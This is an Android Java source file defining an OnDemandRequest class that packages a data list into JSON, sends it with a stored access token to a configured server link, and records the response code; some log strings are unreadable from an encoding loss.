package com.inet.android.request;

import java.io.IOException;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.list.TurnSendList;
import com.inet.android.utils.Logging;

/**
 * OnDemandRequest class is designed to prepare for the one-time sending
 * function
 * 
 * @author johny homicide
 * 
 */
public class OnDemandRequest extends DefaultRequest {
	private final String LOG_TAG = OnDemandRequest.class.getSimpleName()
			.toString();
	private int infoType = -1;
	private String complete;
	private String version;
	Context mContext;
	static RequestDataBaseHelper db;
	SharedPreferences sp;
	Editor ed;

	public OnDemandRequest(int infoType, String complete, String version,
			Context ctx) {
		super(ctx);
		this.mContext = ctx;
		this.complete = complete;
		this.infoType = infoType;
		this.version = version;

	}

	@Override
	public void sendRequest(String request) {
		RequestTask srt = new RequestTask();
		srt.execute(request);
	}

	class RequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		}

		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}

	@Override
	protected void sendPostRequest(String request) {
		// Logging.doLog(LOG_TAG, "1: " + request, "1: " + request);

		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		JSONObject jsonObject = new JSONObject();
		JSONArray jsonArray = new JSONArray();
		String requestArray = null;
		try {
			jsonObject.put("key", System.currentTimeMillis());
			jsonObject.put("list", infoType);
			jsonObject.put("version", version);
			jsonObject.put("complete", complete);
			requestArray = "[" + request + "]";
			jsonArray = new JSONArray(requestArray);
			jsonObject.put("data", jsonArray);

			Logging.doLog(LOG_TAG, "jsonArray: " + jsonObject.toString(),
					jsonObject.toString());

		} catch (JSONException e1) {
			Logging.doLog(LOG_TAG, "json ��������", "json ��������");
			e1.printStackTrace();
		}

		String str = null;
		try {
			Logging.doLog(
					LOG_TAG,
					"do make.requestArray: " + jsonObject.toString() + " "
							+ sp.getString("access_second_token", " "),
					"do make.requestArray: " + jsonObject.toString() + " "
							+ sp.getString("access_second_token", " "));

			str = Caller.doMake(jsonObject.toString(),
					sp.getString("access_second_token", ""), ConstantRequest.LIST_LINK, true,
					null, mContext);

		} catch (IOException e) {
			// ���������� � ���� request
			e.printStackTrace();
		}
		if (str != null && str.length() > 3)
			getRequestData(str);
		else {
			ParseToError.setError(str, request, ConstantRequest.TYPE_DATA_REQUEST, infoType, complete,
					version, mContext);
			Logging.doLog(LOG_TAG, "������ �� ������� ���",
					"������ �� ������� ���");
		}

	}

	@Override
	protected void getRequestData(String response) {
		Logging.doLog(LOG_TAG, "getResponseData: " + response,
				"getResponseData: " + response);
		ed = sp.edit();
		JSONObject jsonObject = null;
		try {
			jsonObject = new JSONObject(response);
		} catch (JSONException e) {
			if (response == null) {
				Logging.doLog(LOG_TAG, "json null", "json null");
			}
			return;
		}

		String str = null;
		try {
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			e.printStackTrace();
		}
		if (str != null) {
			ed.putString("code_list", str);
			ed.commit();
			if (str.equals("1")) {
				Logging.doLog(LOG_TAG, "code = 1 ", "code = 1");
			}
			if (str.equals("0")) {
				ParseToError.setError(response, mContext);
			}

			if (str.equals("2")) {
				Logging.doLog(LOG_TAG, "code = 2 " + "info = " + infoType,
						"code = 2 " + "info = " + infoType);

				TurnSendList.setList(infoType, "0", "0", mContext);
			} else {
				ed.putString("code", "code");
			}
		}

	}

	@Override
	public void sendRequest(int request) {
		// TODO Auto-generated method stub

	}
}
